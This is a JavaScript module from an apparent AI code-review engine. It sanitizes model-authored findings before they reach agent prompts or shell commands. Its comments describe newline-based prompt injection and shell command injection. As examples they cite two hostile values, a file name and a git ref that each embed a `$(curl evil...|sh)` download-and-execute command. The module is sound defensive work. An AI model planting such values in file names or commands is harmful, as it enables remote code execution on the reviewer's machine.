// How a model-authored finding field enters a prompt or a shell command in the review engine (src/review.js).
import { ATTACK_MAX } from './review-adjudicate.mjs'

/** @typedef {import('./review-schemas.mjs').Finding} Finding */

// Model-authored finding fields reach agent PROMPTS as context. The injection vector in a
// single-value prompt field is the NEWLINE (it lets injected text pose as a fresh instruction line);
// markdown structure chars are inert there. So flatten newlines (the vector) while PRESERVING
// identifier characters `_ < > [ ]`: symbols (`handle_request`, `Vec<T>`) and paths
// (`src/review_adjudicate.rs`) carry them and they are LOAD-BEARING — the adjudicate/red-team prompts
// tell the agent to grep the symbol/file to RELOCATE the finding, so mangling them (as sanitizeAttack's
// strip set did) breaks the grep. flattenField neutralizes newlines and caps length while leaving those
// chars intact. Ledger storage stays raw (matchesPrior fingerprints on the unsanitized ruleId+title) —
// only the prompt copy is flattened. The `git diff` shell argument is a SHELL value, not a prompt
// value, so it is NOT routed through flattenField — it is single-quoted with shq(). JSON.stringify does
// NOT make it shell-safe: it only escapes `"`/`\`/control chars, and inside a double-quoted shell
// context `$(...)`, backtick and `$VAR` still expand, so a file literally named `$(curl evil.sh|sh)`
// would execute when the carry agent runs the command. shq() single-quotes it, disabling all expansion.
/** @param {unknown} v */
export function flattenField(v) { return String(v ?? '').replace(/[\r\n]+/g, ' ').trim().slice(0, ATTACK_MAX) }

/** @param {Finding} f */
export function promptFields(f) {
  return {
    title: flattenField(f['title']),
    symbol: flattenField(f['symbol']) || '?',
    ruleId: flattenField(f['ruleId']) || '—',
    file: flattenField(f['file']),
    severity: flattenField(f['severity']),
    // A locator field like file/symbol: paths and identifiers are load-bearing (the verifier is
    // told to OPEN it), so flatten newlines but keep `_ < > [ ]` intact — see flattenField.
    whereChecked: flattenField(f['whereChecked']),
  }
}

// A conservative "is this a safe commit-ish?" gate for a model-authored ledger `head` before it is
// interpolated into a shell command. Accept a git SHA (7–40 hex) or a ref name drawn only from
// shell-inert characters (alnum plus `._/-`, no spaces/metacharacters). A crafted `HEAD $(curl evil|sh)`
// fails — it carries a space and `$()`. Used at the prior-round LOAD boundary to fall back to a safe
// default without disabling re-review; the use sites additionally shq()/flattenField() it (defense in depth).
/** @param {unknown} s */
export function isCommitish(s) {
  const v = String(s ?? '').trim()
  if (!v) return false
  if (/^[0-9a-fA-F]{7,40}$/.test(v)) return true
  return /^[A-Za-z0-9][A-Za-z0-9._/-]{0,199}$/.test(v)
}
